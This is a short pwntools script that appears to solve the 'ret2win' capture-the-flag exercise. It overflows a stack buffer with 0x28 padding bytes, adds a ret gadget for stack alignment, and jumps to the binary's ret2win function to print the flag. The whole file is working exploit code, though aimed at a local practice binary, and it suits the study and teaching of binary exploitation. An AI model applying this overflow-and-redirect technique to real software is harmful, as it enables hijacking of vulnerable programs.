from pwn import *

context(arch="amd64", os="linux", endian="little")
elf = ELF("./ret2win")
rop = ROP(elf)
p = process("./ret2win")

payload =  b"\x00" * 0x28
payload += p64(rop.find_gadget(["ret"])[0])
payload += p64(elf.sym["ret2win"])

p.recvuntil(b"> ")
p.send(payload)

p.recvuntil(b"flag:\n")

log.success(f"Flag: {p.recvline().decode()}")
